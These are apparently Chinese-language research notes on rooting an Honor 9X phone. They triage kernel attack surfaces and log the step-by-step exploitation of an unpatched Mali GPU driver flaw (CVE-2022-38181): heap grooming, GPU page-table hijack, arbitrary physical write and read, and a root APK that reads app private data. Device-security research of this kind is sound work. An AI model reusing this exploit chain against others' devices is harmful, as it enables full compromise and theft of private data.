# HLK-AL00（荣耀9X 全网通，代号 HLK-AL00）内核安全研究笔记

## 当前状态速查（2026-11-11 v1.4 三页 UI + 手动补丁版）

- **主交付物**：`bin/hlk-root-guard.apk`（code 14 / 1.4，3.7 MB，
  md5 `3707b66a…`）；开机约 7 分钟（最坏约 15 分钟，见 §46）自动提权 +
  双模块。**Termux 补丁改为「补丁」页手动点一次，无常驻后台线程**（§47）。
  官方 Manager 是**可选的第二包** `bin/SukiSU_v4.2.1_40994-release.apk`，
  开机 / 每次打开 APP 时接管（「工作中 + 越狱模式」）；不装不影响 root。
- **★ su 前端修复（tmoe 兼容性）**：`su -c` / `sudo CMD` 的多参数逐个
  重新加引号，tmoe 的 `sudo sed -i -E "s@^(...)@..."` 不再报
  `unexpected '('`；「Termux 补丁」同时放开 tmoe 配置目录权限（0700→0755）、
  补 `tsudo`、修 profile.d 软链。见 C-90 / C-91 / C-92、§45 / §46 / §47。
- **★ 主包瘦身 16.4 MB**：内置的 17 MB `ksu_manager.apk` 与自动安装器
  已移出主 APK（20.2 MB → 3.7 MB）。v1.4 起 Manager 只在开机链末尾与
  打开 APP 时各查一次 uid，不再有常驻监视。见 C-88 / C-92、§43 / §47。
- **★ 探针不可终止（C-94）**：SukiSU root 虽由内核模块独立提供，但探针
  退出会 teardown 被污染的 GPU 页表 → panic → 重启清空全部 root。
  `ps` 的 109 MB 是 GPU 映射会计，真实 PSS 仅 ~4.9 MB。维持 keepalive。
  见 `docs/RESEARCH_LOG.md` §48。
- **root 会话**：`uid=0 / u:r:shell:s0`、`CapPrm/CapEff=1fffffffff`、
  `Seccomp: 0`、**FBE 会话 keyring 已保留**（`fbe_keyring: mode=preserved`），
  可在 `/data` 自由建目录/建文件、读取应用私有数据。
- **★ 全新出厂流程（v1.4 起）**：开机链只做提权 + 双模块，**不碰 Termux**；
  装好 Termux 并首次打开后，进 APP「补丁」页点一次「应用补丁」即可让
  `su` / `sudo` / `tsu` 与 `mount` 等系统工具全部可用，无需电脑。
  **每次重启、pkg upgrade、tmoe 重新部署容器后需再点一次**（allowlist 是
  模块内存）。见 C-85 / C-87 / C-92、`docs/RESEARCH_LOG.md` §40 / §42 / §47。
- **★ mount namespace 可用（纠错）**：`CONFIG_NAMESPACES is not set` 只关掉
  UTS / IPC / USER / PID / NET 五类；mnt ns 无条件编进内核，`unshare -m`
  真机实测隔离且支持多实例，但必须配 `mount --make-rprivate /`。
  见 C-86、`docs/RESEARCH_LOG.md` §41。
- **当前教程**：`docs/USAGE.md`（按最新成果全量重写）。
- **完整源码与产物**：`src/`（三个子工程）+ `bin/`（可直接部署产物），
  唯一校验清单为包根 `MANIFEST.md5`。
- **真机验收**：4 轮 400 s 门开机，JIT_FREE 4/4、root + 双模块 4/4、
  零 `RC=159`（§37、C-79）；修复后重启再验见 §39 / C-84。
- 本文其余 C-xx 条目是**历史研究记录**，路径以当时工作目录为准，
  不回改正文；旧路径 → 现在位置的换算表见包根 `README.md` §3.4
  与研究根 `README.md` §2。

## 文档入口

- `sukisu-ultra/README.md` — **★ 当前终态**：SukiSU Ultra 临时 root 的版本锁定、部署/恢复/授权教程、md5、红线与边界
- `docs/RESEARCH_LOG.md` — 完整研究过程（按时间顺序，含版本演进、panic 复盘；**第 21 章 = SukiSU Ultra 实机落地**）
- `docs/USAGE.md` — ★ **当前版本使用教程**（v1.3 全量重写：装机、门禁、root 使用、两层自愈、开关、排查、构建复现、校验）
- `docs/mali_lpe_design.md` — 利用链设计（源码行号、ABI、风险表；附录 H = 模块链终点）
- `../README.md`（发布包根）— 结论表、快速开始、目录结构、md5、红线
- 本文 — 结论型技术速查（**C-41…C-54 = SukiSU Ultra 终态与一体化 APK**）
- **发布副本**：`hlk-root-dist/`（可直接拷走；含开机 root 底座 APK/探针、`sukisu-ultra/` 终态产物、koffs、归档与上述文档。源码/kimage/工具仍在原始仓库）

> **产物状态（2026-11-08 更新）**：本文是历史研究记录。正文提到的旧探针版本、`enfread`、`ksu-lkm/*` 等**已从发布包删除**；`probe/archive-v*` 已归入研究目录 `archive/probe-history/`。当前可用产物、源码与教程只看 `current/`、`docs/USAGE.md`。

目标机：HLK-AL00（荣耀9X 全网通，开发代号 **Hulk**；注意 Play4T Pro 是 AQM-AL00/Aquaman，勿混淆），Kirin 810, Magic UI 3.1 (EMUI 10.1), Android 10
固件：10.1.0.138(C00E118R6P2)，安全补丁 2020-10-01，内核 4.14.116（编译于 2021-07-29）
BL：locked（fastboot 通道正常）

## 内核防护基线（来自 /proc/config.gz，见 config/）

- 启用：KASLR、HARDENED_USERCOPY、SLAB_FREELIST_RANDOM、REFCOUNT_FULL、PANIC_ON_OOPS、SELinux Enforcing、KALLSYMS(_ALL)
- 未启用：USER_NS（userns 全灭 → netfilter/overlayfs 类公开 exploit 全部不可用）、USERFAULTFD、IO_URING、BPF_JIT
- perf_event_paranoid = 3（perf 通道关闭）
- kallsyms/kptr 对 shell 不可读

## 关键发现：SELinux domain 级无差别授权（vendor_sepolicy.cil）

以下设备对所有进程域（含 untrusted_app）开放 chr_file ioctl/read/write：

| 设备节点 | 标签 | 备注 |
|---|---|---|
| /dev/hwlog_exception | exception_device | 华为异常日志驱动，DAC 还额外 world-writable |
| /dev/hwlog_dubai | dubai_log_device | 功耗统计日志驱动 |
| /dev/hwlog_jank | jank_device (29_0) | |
| /dev/tc_ns_client | teecd_device | **iTrustee TEE 用户态命令接口，直通 Secure World** |

untrusted_app 额外获得 exception_device 的 write/lock/append/map/open。

## 其他观察

- /dev/ion（ion_device）：shell 域有完整 ioctl 权限（可从 adb 直接动态测试 ION）；untrusted_app 无权限（仅 isolated_app 只读）
- /dev/nve0（recovery_device）：NV 存储节点，BL 解锁状态所在，DAC root:system 770，SELinux 仅 system_server/drmserver 等可 ioctl
- 麒麟 810 的 BL 解锁校验在 TEE（这是 PotatoNV/Kirin-Tool 不支持 810 的原因）

## 优先攻击面排序（待静态分析确认）

1. tc_ns_client ioctl 命令接口（iTrustee 驱动）— 任何 App 可达，直通 TEE
2. hwlog_exception / hwlog_dubai 的 ioctl+write 路径 — 任何 App 可达
3. 海思版 ION 驱动 — shell 可达（动态测试友好），配合 kallsyms 需要内核镜像
4. hisi_perf_ctrl / motionhub / hwgnss — system 组，需提权后可达，次级

## 静态分析进展（任务3）

### A. /dev/tc_ns_client（TEE 客户端）——已排除 ✗
源码：`drivers/hisi/tzdriver/core/tc_client_driver.c` + `teec_daemon_auth.c`
- `tc_client_open()` 强制 `check_teecd_access()`：调用者 exe 路径 SHA256 必须等于硬编码的 teecd 哈希，且 SELinux 标签必须为 `u:r:tee:s0`
- 结论：SELinux 的 domain 级开放规则无意义，只有 /vendor/bin/teecd 能 open。第三方 App/Shell 全部被驱动层挡死
- 次要：LOGIN ioctl、GET_TEE_VERSION 也有 teecd 检查；TST_CMD → `tc_ns_tst_cmd`（tz_spi_notify.c:569）是空壳，只打 "usr img do not support this cmd" 返回 0，无攻击价值 ✗

### B. /dev/hwlog_exception ioctl 转发链 —— fdleak 子系统（已修正：SELinux 封死 ioctl ✗）
实机配置：只有 CONFIG_HW_FDLEAK=y（ZEROHUNG/ERECOVERY/MEMCHECK 未启用）
源码：`drivers/hwfdleak/fdleak_main.c`，经 `hw_logger.c::logger_ioctl` 对 name==hwlog_exception 的 fd 转发
- ~~内核侧 fdleak_ioctl 三个命令均无权限校验~~（代码事实，但）**SELinux 实际授权**：untrusted_app 对 exception_device 只有 `(chr_file (write lock append map open))`，**没有 ioctl**；ioctl 完整授权仅 logserver/system_server；shell 域连 chr_file 都没有
- **实测（probe/fdleak_probe.c）**：shell 域 ENABLE_WATCH/GET_STACK 全部 errno=13 EACCES，与策略一致 → fdleak 无鉴权缺陷在真机上被 SELinux 封死，不可利用 ✗
- 仍有效的面：untrusted_app 可 write /dev/hwlog_exception（伪造异常日志 → hiview 用户态解析面，非内核）；write 需 4 字节 magic 0x7BCDABCD 打头
- fdleak_report 另有 usertype==BETA_USER(3) 门禁（/proc/log-usertype 0600 root-only，商业机出厂 1），即使 ioctl 可达还需 beta 机

### C. Mali kbase（/dev/mali0）—— ★★★ 关键纠正：设备是 HM2（2021）代码，多枚公开在野 CVE 未修复
实机：CONFIG_MALI_GONDUL=y → **bifrost-r18p0-01rel0**（drivers/gpu/arm/，Mali-G52，BASE_UK 11.16，VERSION_CHECK 实测确认）
可达性：/dev/mali0 crw-rw-rw system:system，标签 gpu_device；`base_typeattr_204=(and (appdomain)(not isolated_app))` 有完整 chr_file ioctl/read/write；**shell 域实测同样全程可达**
实测（probe/mali_probe.c）：open OK → VERSION_CHECK(11.16) OK → SET_FLAGS(kctx 创建) OK → MEM_FLAGS_CHANGE 通（bogus 地址正常 EINVAL，设备无恙）
注意：MEM_FLAGS_CHANGE 在未 SET_FLAGS 前返回 EPERM（kbase_file_get_kctx_if_setup_complete），不是 SELinux

**版本判定（务必以此为准）**：
- 工作区 `src/Code_Opensource/.../bifrost-r18p0-01rel0` 与 **HLK-AL00a_HM3** 源码包逐字节一致（mali_kbase_mem_linux.c md5 相同，文件时间 2023-03-29）→ 它是**后期加固版参考**，不是设备代码
- 设备为 HLK-AL00，内核构建 2021-07-29（/dev 节点时间同为 2021-07-29）→ 对应 **HLK-AL00_HM2** 源码包（文件时间 2021-08-31）
- 已把 HM2 的 Mali 树解包到 `refs/Code_Opensource/kernel/drivers/gpu/arm/bifrost-r18p0-01rel0/`，**后续设备侧分析一律用这棵树**
- HM2→HM3 全量 diff：`/tmp/hm2_hm3_mali.diff`（20 文件、79 hunk），即华为 2021→2023 回移的安全补丁清单

**HM2 缺失、HM3 才有的修复（=设备可利用面）**：
1. **CVE-2022-38181 主守卫**：`kbase_mem_flags_change` 的 `if (reg->flags & KBASE_REG_NO_USER_FREE) goto out_unlock;` —— HM3 有，**HM2 没有**（HM3 mem_linux.c:931-938；r40p0 同款注释）
2. `kbase_mem_commit` 的 NO_USER_FREE 检查 —— HM2 没有
3. **CVE-2021-39793 / CVE-2022-22706**：HM3 的 `kbase_jd_user_buf_pin_pages` 与 `kbase_mem_from_user_buffer` 均改为 `write = reg->flags & (CPU_WR|GPU_WR)`；**HM2 只看 GPU_WR**（mem.c:3844/3860/3866）→ 只读用户页被 pin 成可写
4. `kbase_mem_alias` 整数溢出检查 `if (stride > U64_MAX / nents) goto bad_size;` —— HM2 没有（CVE-2022-36449 同类 OOB 写）
5. `kbase_jd_user_buf_unmap` 增加 reg 参数并 `kbase_mem_shrink_cpu_mapping`；extres 回滚路径按地址重新查 region —— HM2 没有
6. `kbase_ctx_sched_remove_ctx` 锁重构（在函数内取 pm/mmu_hw/hwaccess 锁），并在 js term 中移除 ctx —— HM2 在 context term 末尾手工加锁，存在竞态面
7. MMU teardown 先 `entries_invalidate` 再递归；vector-dump 按 CONFIG 门控；event 结构 memset —— HM2 没有
- **注意**：HM3 也没有 r40p0 的 shrinker `!alloc->reg` / reg=NULL-入锁 / evict_nents（说明这些不是华为回移重点）
- 结论：**此前"华为已修复 39793/28664/38181"的判断全部来自误用的 HM3 源码，对设备无效**
**CVE-2022-38181 结论（已由公开资料坐实）**：
- GHSL-2022-054 公告 + GitHub Security Lab 博文（Pwning Pixel 6…）确认：补丁核心就是给 `kbase_mem_flags_change` 加 NO_USER_FREE 检查；device 的 HM2 没有该检查
- 原语：MEM_FLAGS_CHANGE(jit_va, DONT_NEED) 把 JIT 区域挂入 evict_list → 内存压力下 shrinker 释放 backing，`jit_alloc[id]` 悬空 → `kbase_jit_free`/backing_lost 触发 UAF；可复用释放的 region 对象做 GPU PGD 劫持
- **HM2 无守卫 → 设备存在该原语**；probe/mali_jit_probe 在设备上应返回 **0**（而非 EINVAL）——这是判定 HM2 运行时的动态铁证
- 时间线自洽：设备安全补丁 2020-10、内核 2021-07，而 ARM 修复在 r40p0（2022-10）

**其余适用 CVE**：
- **CVE-2021-28663**（GPU MMU 操作 → 物理页 UAF，在野利用，P0 有完整 RCA）与 **CVE-2021-28664**（只读页被改写）：HM2 均未修复（HM3 才见相关加固）
- **CVE-2023-6143**（软件竞争 → UAF；Bifrost r1p0–r18p0，修复于 r19p0）：设备恰为 r18p0 → 受影响
- **CVE-2023-4211**（Bifrost r0p0–r42p0 → r43p0，在野利用，无公开细节）：受影响
- CVE-2024-4610（r34–r40）与 CVE-2023-6241（CSF）：**不适用** ✗

**probe/mali_jit_probe.c（已编译，待真机运行）**：
- 静态断言 atom_v2=56B、jit_alloc_info=40B
- 序列：VERSION_CHECK(11.16) → SET_FLAGS(0) → MTP mmap(3<<12) → MEM_JIT_INIT(64页,8,0,0) → MEM_ALLOC 1页 SAME_VA+mmap → JOB_SUBMIT JIT_ALLOC(0x209) → 读回 gpu_alloc_addr → MEM_FLAGS_CHANGE(jit_va, DONT_NEED)（**0=HM2 漏洞存在 / EINVAL=已加固**）→ 若是 0 则撤销 → JIT_FREE(0x20a) → 普通 native 区域正对照（预期 0）→ close
- 仅验证 flags_change 返回值，不施加 shrinker 压力、不触发 UAF（避免 PANIC_ON_OOPS）
- **阻塞点**：ADB 不可用。设备在 Windows 仅枚举为 "HONOR 9X"(WPD) 和 "HUAWEI Mobile Connect - Fake Acm Interface (COM5)"，无 ADB interface，`adb devices` 空；需在手机上重新开启 USB 调试/撤销授权重连

### D. 海思 ION 驱动审计（静态+动态完成）
源码：`drivers/staging/android/ion/`（ion.c / ion-ioctl.c / mm/of_mm_ion.c / ion_secsg_heap.c / ion_seccg_heap.c + ion_sec_contig.c / ion_cpa_heap.c / ion_dma_pool_heap.c）

**ioctl 面（ion-ioctl.c）**：只有 ION_IOC_ALLOC(_IOWR('I',0)) 和 ION_IOC_HEAP_QUERY(_IOWR('I',8))，无鉴权、heap_id_mask 用户可控。ion_alloc 内有转换规则：CAMERA heap 位会自动加 SECURE 标志、DRM 会加 CPA 位等。

**实机堆表（phase-1/2 探测已验证）**：shell 可直接分配 system(id0)、protect_heap(id20, SEC_CONTIG)、protect_cpa_heap(id22, CPA)，且这两个安全堆接受 ION_FLAG_SECURE_BUFFER(1<<3) 无任何鉴权。

**安全堆 mmap 读回（保密性破坏问题）——已排除 ✗**：
- `ion_mmap()`（ion.c:437）先查 `ops->map_user == NULL` → CPA 堆（ion_cpa_ops 只有 .allocate/.free，ion_cpa_heap.c:936）直接 -EINVAL
- SEC_CONTIG（protect_heap）：`ion_seccg_heap_map_user`（ion_seccg_heap.c:389）heap_attr != HEAP_NORMAL → -EINVAL
- DMA_POOL：`ion_dma_pool_heap_map_user`（ion_dma_pool_heap.c:581）flags 带 SECURE → -EINVAL
- kmap 路径同样有防护：`ion_dma_buf_kmap`（ion.c:470）先查 `ops->map_kernel`；`ion_buffer_kmap_get`（ion.c:319）的裸 `ops->map_kernel` 调用唯一调用方就是这个有防护的入口
- 结论：三层防线（map_user 检查 / heap_attr 检查 / map_kernel 检查）都正确，**CPU 读安全缓冲不会造成 panic，也读不到内容**，安全（可以放心在真机做 mmap 验证，预期 -EINVAL）

**真实问题（有限价值）**：
1. **安全 CMA 池预算 DoS**：shell 无鉴权可把 protect_heap/protect_cpa_heap 的配额吃满（`__seccg_heap_input_check` 只查 overflow 和 heap_size 上限，`__secsg_heap_input_check` 同理），导致 DRM/相机安全分配失败
2. **安全内存零清除**：SEC_CONTIG 只有 heap_attr==HEAP_NORMAL 才 memset（`__seccg_alloc_contig` ion_sec_contig.c:431、`__seccg_free_pool` 同理）；安全缓冲释放后内容原样保留回 gen_pool/CMA。配合 1，如果后续 TEE 保护命令失败路径处理不严，存在跨使用者数据残留的理论窗口（CPU 侧读不到，价值有限）
3. `ion_seccg_heap_phys` / `ion_secsg_heap_phys` 返回 `buffer->id` 当物理地址（ion_secsg_heap.c），语义怪异但有 "sec buffer don't support get phys" 前置拦截

**动态验证（phase-3，probe/ion_probe3.c，真机已跑）**：
- protect_heap(20)+SEC alloc OK → mmap = EINVAL；protect_cpa(22)+SEC alloc OK → mmap = EINVAL；system(0) mmap 正常。设备无异常
- 三层防线实锤：静态结论（map_user/heap_attr/map_kernel 检查齐全）与真机行为一致
- 坑：/dev/ion DAC 为 crw-rw-r-- system:system，shell 不在 system 组，**必须 O_RDONLY 打开**（other 位有 r，且内核 ion_ioctl 不检查文件打开模式，ALLOC ioctl 照常工作）。用 O_RDWR 会被 DAC 拒绝，与 SELinux 无关

**注册链**：of_mm_ion.c:739 → ion_seccg_heap_create（DT 属性 heap-attr/per-alloc-size/per-bit-size/water-mark 决定堆行为）；SECSG ops 在 ion_secsg_heap.c:730

### C-2. HM2 运行时验证结果（真机 shell，2026-11）
探针：probe/mali_stage2_probe.c（综合）、mali_submit_probe.c（ABI 扫描）、mali_alias_probe.c（隔离 alias 复测，含 SIGBUS 捕获）

已证实：
- **atom ABI 与 refs 头文件不一致**：运行时 `sizeof(base_jd_atom_v2)=48`（无 `base_jd_thro` 字节；jc/udata/extres/nr_extres/pre_dep/atom_number/core_req 偏移不变）。`JOB_SUBMIT` 对 stride!=48 一律 EINVAL。refs 头文件里的 56B 结构体不能直接用
- **CVE-2022-38181 原语在设备上成立**：`MEM_FLAGS_CHANGE(JIT_VA, DONT_NEED)` 返回 0；撤销 ioctl 返回 EINVAL 是 HM2 代码缺陷（`ret` 初值 -EINVAL，unmake 分支不回填），内部 unmake 实际执行，随后 JIT_FREE 成功
- **JIT_ALLOC/JIT_FREE 软作业可用**（core_req 0x209/0x20a）；WRITE_VALUE 作业可用（job type 2，header 32B，payload 在 +32）
- **WRITE_VALUE 已做无副作用自测**：64 位与 32 位立即数各写一次自己的 GPU 页，CPU 读回校验 PASS；事件 DONE
- **MMU dump 可用**（mmap offset 1<<12）：首部 3×u64 配置（transtab/memattr/transcfg），之后每表首 u64 为 `PA|level`，512 项；实测 4 级表，叶子 PTE `(e&0x443)==0x443`，下一级 `(e&0x443)==0x403`。shell SELinux 不拦截 mali ioctl 与 dump mmap
- **MEM_COMMIT 行为**：alloc 25 页 commit=0 → mmap（backed=0）→ MEM_COMMIT(25) → QUERY 返回 25，25 页可触碰
- **GPU props**：product 0x7402，log2_pc=25，可用 GPU 内存约 5.89 GB；RAW_JS_FEATURES 35=0x20e/36=0x4fe/37=0x7e；coherency 0x101（CPU-coherent），coherent groups=1
- HM2 defconfig 中 `CONFIG_MALI_DEBUG` 未开（`refs/hm2-config/.../merge_orlando_defconfig:4396`），故 `KBASE_DEBUG_ASSERT` 不产生 BUG_ON；`CONFIG_GPU_GMC_GENERIC=y`

MEM_ALIAS 语义（静态+实机交叉确认）：
- 单次大 mmap 覆盖多 entry alias 时，CPU fault 只对**第 0 个 entry** 有效：`kbase_cpu_vm_fault()` 用 VMA 起始偏移定位 entry，随后 `fault_pgoff >= nents` 即 `VM_FAULT_SIGBUS`。访问第 4 页（第二个 chunk）必然 SIGBUS——这是设计行为，不是漏洞触发
- 公开 exploit 因此对每个 stride chunk 单独 mmap（offset 用已映射用户 VA + i*chunk）——**但在本机（GMC）上这一步会 panic，见下**
- 注意 alias 源 region 在 HM2 上必须带 `KBASE_REG_GPU_CACHED`（默认满足）、非 DONT_NEED/NO_USER_FREE、coherent 标志与 alias 一致；alias 的 `num_pages=nents*stride`，entry.length ≤ stride

**别名 panic 根因（2026-11 实机二分确认）**：
- 探针 `probe/alias_bisect.c`（每步写 `/data/local/tmp/alias_bisect.log` 并 `fsync`，panic 后仍可读）结果：
  - mode 0/1/2/3/4（alloc→MEM_ALIAS→cookie mmap→fault 0..3 页）全部存活；mode 1 显示 `MEM_ALIAS ok: flags=0x400d cookie=0x41000 pages=4`
  - mode 5（nents=2 alias + 公开 exploit 式“按 chunk 重映射”）在 **chunk0 的 default-case mmap 内**确定性 panic；日志停在 `per-chunk remaps`，重启后 `sys.boot.reason=kernel_panic,null`、`sys.resettype=abnormal:AP_S_PANIC`，历史时间戳 +1627556796（前两次：1627541060 stage2 run2、1627556300 隔离 alias 探针）
- 根因链：default-case alias mmap（`vma->vm_pgoff` 是别名区地址、`nr_pages>0`）→ `mali_kbase_mem_linux.c:2465 kbase_get_compressed_region(reg, vma->vm_pgoff, nr_pages)` → `kbase_gmc_decompress_alloc()`；ALIAS alloc 由 `kbase_alloc_create(kctx, 0, KBASE_MEM_TYPE_ALIAS)` 创建，`pages[]` 为零长数组，而该函数**无 type/边界检查**直接读 `alloc->pages[i]`（越界读相邻 slab）。若垃圾值满足 `as_phys_addr_t() && (gmc_flag & 0x80)`，就调用 `kbase_gmc_page_decompress(p, alloc->imported.native.kctx->kbdev, ...)`；union 布局中 `native.kctx` 与 `alias.stride` 同偏移，实际值 = stride（4），解引用 0x4 → oops → `PANIC_ON_OOPS=y` 直接 panic。cookie 路径 `kbasep_reg_mmap()` 把 `nr_pages` 改为 `kbase_reg_current_backed_size()`=0（alias 无 CPU 后端页），因此不触发
- **规避并实测通过**：每个源区域单独建 `nents=1` alias（`stride=length=SPRAY_PAGES=25`），只通过 cookie mmap 访问，不按 chunk 重映射。mode 7：2 个源 ×25 页，全部页可读、值匹配，源写后别名读一致（同物理页）
- **对 PoC 的影响**：公开 exploit 的“nents=64 大 alias + 64 次 chunk remap”在该机型必然 panic；必须改为 `alias[64]` 逐个 nents=1 创建/mmap，`find_pgd` 索引改为 `alias_va[freed_idx] + pgd_idx*0x1000`。其余（JIT UAF→页表重用→GPU WRITE_VALUE 任意写）不变
- 探针源码：probe/alias_bisect.c（mode 0-5 二分，mode 7 规避验证）；构建：`zig cc -target aarch64-linux-musl -static -O2`

### C-3. Phase B 真机验证通过（2026-11，probe/jit_uaf_probe.c）

**Phase A（纯 evict 验证，probe/jit_evict_probe.c）**：JIT 25 页 + DONT_NEED 后灌匿名内存，`MEM_QUERY(JIT VA)` 在 chunk 87（2816 MiB）处返回 EINVAL（提交量跌出，region 已被 shrinker/销毁 worker 回收）→ 原语成立且可观测。不同运行在 2.8–3.6 GiB 之间触发（chunk 87/105/116）。

**历史 panic（已定位并修复）**：调试早期两次真机 oops → `PANIC_ON_OOPS=y` 直接重启（`sys.boot.reason=kernel_panic,null`，时间戳 1627557609/1627556796）。根因不是漏洞本身，而是探针缺少公开 exploit 的 **CPU-0 绑定**：destroy worker 在调用进程的 CPU 上 `kfree(reg)`，若后续 spray 落在别的 CPU 的 slab freelist 上，悬空的 `kctx->jit_alloc[id]` 就可能指向非 native 对象（例如 ALIAS 的 phy_alloc，`imported.native.kctx` 与 `alias.stride` 同偏移 = 25 → 解引用 0x19 → oops）。修复：进程 `sched_setaffinity(CPU0)`，检测到 eviction 后立即在同一 CPU 连续 spray 128 个 native region，中间不插入日志/系统调用。修复后再未 panic。

**最终成功序列（EXIT=0）**：
```
evicted at chunk 116 (pressure 3616 MiB, query errno 22, released 4 chunks); sprayed 128 native regions
committed 128 regions x 25 pages / created 128 nents=1 aliases / mismatches=0
drain pool filled and released
JIT_FREE submit ret=0
spray[3] commit: ret=0 value=0            <- 悬空指针落在 spray[3]
pre-reuse alias[3]: q0=0 pattern_qwords=0 zero_qwords=12800   <- 25 页已被零化（spill 路径）
mapped 32 reserved regions on fd2
post-reuse alias[3]: nonzero_qwords=511
find_pgd -> idx=20 entry=0x40000211738443
PHASE_B OK freed_idx=3 pgd_idx=20 pgd_gpu_va=0x7fe32f000 entry=0x40000211738443
```
即：UAF 命中 → JIT_FREE 把**仍存活的** spray[3] 的 25 页全部释放 → fd2 mmap 的 reserved region 用这些页做 GPU 页表 → 旧 alias 仍映射这些页，CPU 直接读到合法页表项（`entry&0x443==0x443`）。

**设备适配要点（与 Pixel 6 参考实现的差异）**：
1. **SAME_VA cookie 只有 64 项**（`BASE_MEM_COOKIE_BASE=64<<12`）：128 个 region 必须分批 alloc→mmap（32/批）释放 cookie；不能一次 alloc 128 个。
2. **alias 形状**：每源一个 `nents=1, stride=length=25` 的 alias，只走 cookie mmap（default-path remap 会触发 GMC 解压 panic，见上）。
3. **drain 必须在 JIT_FREE 前 alloc+free**：先把 kctx small[0]（1024 页）和 device small[0]（余量）填满，JIT_FREE 释放的 25 页才会被 spill 到 device pool 头部（`kbase_mem_pool_add_array(zero=true)` 顺带清零——pre-reuse 观测到 `zero_qwords=12800` 正是此标记）。若池未满，页被留在 kctx 池里，fd2 页表永远拿不到。
4. **fd2 必须用 MMU group 0**：华为 `kbase_mem_get_group_id()` 清掉 alloc 侧 group 位，所有释放页只进 group 0 的 device pool；参考实现 fd2 用 group 1，在本机其页表会从 small[1] 分配，永远无法复用我们在 group 0 释放的页（这正是此前 find_pgd 失败的原因）。
5. **eviction 后释放 4 个 32 MiB 压力块**：只在内存濒临耗尽时才会触发 shrinker，spray 需要一点余量；释放过多会把刚 kfree 的 slab 槽位暴露给无关 CPU 0 活动。
6. JIT_FREE 不需要等待：soft job 在 `kbase_jd_submit()` 内同步执行（含 finish→`kbase_jit_free`）。

**下一步（任务 #10）**：`WRITE_VALUE` 经 fd1 写 alias VA 覆盖 fd2 页表页中的 PTE[0x100] → 让 fd2 的一个 reserved VA 重定向到目标物理页 → 经 fd2 提交写作业完成任意物理写。先做**安全自证**：目标取同一页表里另一个 reserved 页的物理地址，写 magic 后从 CPU 侧的 reserved VA 读回；最终 payload（SELinux/cred 补丁）仍缺 HM2 内核镜像与符号/物理基址。

### C-4. Phase C 真机验证通过：GPU 侧任意物理写（2026-11，probe/jit_write_probe.c）

**目标**：用 fd1 的 `WRITE_VALUE` 作业改 fd2 活页表的叶子 PTE，把某个 2 MB 块的 4 KB 页重定向到选定物理页，再用 fd2 的 `WRITE_VALUE` 写该物理页，证明“任意物理写”原语（参考实现最终 payload 的基础）。

**实现要点**：
1. 页表选择：alias 中 `(e&0x443)==0x443` 的项一定是叶子（下一级描述符是 `entry_set_pte()` 写的 `phys|0x403`，bit6=0），其 PA 必为数据页。优先 `k=0x100`，否则取第一个叶子；`t` 取另一个叶子；`target = pt[t] & 0xfffffffff000`。
2. `gpu_write64()`：1 页 GPU region 中打包 MALI_JOB_HEADER（`word4 = is_64b | type<<1`）+ WRITE_VALUE payload（address@+32, type=7 IMMEDIATE_64, imm@+48），提交 `BASE_JD_REQ_CS` 原子并等待 DONE（event_code 0x1）。
3. 候选块：只对 reserved VMA 覆盖的 2 MB 块 `B` 写 `B+k*4K`，保证该 VA 在 fd2 地址空间内且更高层页表存在。
4. **事件队列错位（本次修复）**：JIT_FREE 是 soft job，`kbase_jd_submit()` 同步完成但仍会在 fd1 上排一个 DONE 事件；若不消费，后续 PTE 写的 `wait_event()` 会立刻拿到这个旧事件并提前读回，restore 的 wait 又会吃掉 PTE 写的事件 → restore readback 看似失败（上一轮读到 `0xdd4e8443`）。修复：JIT_FREE 后调用 `drain_events(fd)`（poll timeout 0 循环读空）。

**最终成功日志（EXIT=0，2026-11-03）**：
```
JIT_FREE submit ret=0 errno=0
drained stale event atom=2 code=0x1
spray[16] commit: ret=0 value=0
find_freed_idx -> 16
post-reuse alias[16]: nonzero_qwords=510 q0=0x0 q512=0x0
find_pgd -> idx=23 entry=0x400000cceb7443
PHASE_B OK freed_idx=16 pgd_idx=23
phaseC: table nonzero=512 leaves=3 k256=0x2
phaseC: k=509 orig=0x400000cceb7443 t=510 target_pa=0xcd28e000
phaseC: PTE write ret=0 readback=0xcd28e443
phaseC: 2 candidate 2M blocks
phaseC: B=0x7ffc00000 page[k]=0x4d414749435f4f4b MAGIC
phaseC: B=0x7ffa00000 page[k]=0x0 (not magic)
phaseC: V0=0x7ffa00000 page[t=510]=0x4d414749435f4f4b MAGIC
phaseC: PTE restore ret=0 readback=0x400000cceb7443
PHASE_C OK freed_idx=16 pgd_idx=23 k=509 t=510 v0=0x7ffa00000
```
含义：写 PTE[k] 后 CPU 立即读到新项（`0xcd28e443`）；fd2 对 `B+k*4K` 的普通写落在目标物理页 T（从 V0 的 `page[t]` 读到 MAGIC），而同一块原 page[k] 未被写；其余候选块正常；restore 后 readback 精确等于原值。**任意物理 4 KB 页写（8 字节/次）已可用。**

**本轮 grooming 加固**：`SPRAY_NUM=1024`（分批 32 alloc→mmap 绕 64 cookie 限制）、drain region 改为 UAF 前预分配、eviction 后仅释放 16 个压力块、`MAX_PRESSURE_CHUNKS=192`。此前 128 region + 检测后才 alloc drain 的版本会让 freed kmalloc-512 slot 被 ALIAS/drain region 抢到，JIT_FREE 解引用错误对象 → oops → panic。1024 个连续 native spray 后未再发生。

**物理写通道的边界**：写点必须位于 fd2 已有更高层页表覆盖的 2 MB 块内（当前用 reserved VMA 构造）；每次写需先改 PTE、写目标、再恢复（或保留映射批量写）。`WRITE_VALUE` 只有写方向，CPU 读端（alias fault）走 `alloc->pages[]` 而非 GPU PTE，因此**当时仍无任意物理读**；最终 payload 仍依赖 HM2 内核镜像确定物理基址与符号偏移。

### C-5. Phase D 真机验证通过：MMU dump 任意物理读（2026-11，probe/jit_write_probe.c）

**原理**：`kbase_mmu_dump()` 对 kctx 页表做 DFS，每条记录 `u64 (table_pa|level)` + 512 项；level<3 时对 `(e&3)==3` 的项继续下钻，且用 `kmap(pfn_to_page())` 读物理页。因此把活 L2 表中一个空闲槽写成 `target_pa|0x403`，dump 就会把目标物理页当作 L3 表整页复制出来。

**实现**：
1. phase D 先对 reserved region 的某页写已知标记 `0x447564445f524541`（"READ_DuD"）并在 CPU 侧读回，得到它的 PA（`target_pa`）。
2. 解析 dump（offset 24 起，每条 8+4096 字节；层级 `h&3`，表 PA `h&~0xFFF`），找到唯一的 level-2 表（自由槽 0..508，仅 509/510/511 有效）。
3. fd1 把 PTE[k] 指向该 L2 表 → fd2 写 `L2[slot]=target_pa|0x403` → 恢复 PTE[k] → `cache_thrash(32MB)` → 重新 dump → 目标记录出现且内容等于标记。
4. 完成后恢复 L2 槽原值（0x2）与 PTE[k]；要求 `dump_val == cpu_val` 才打印 `PHASE_D OK`。
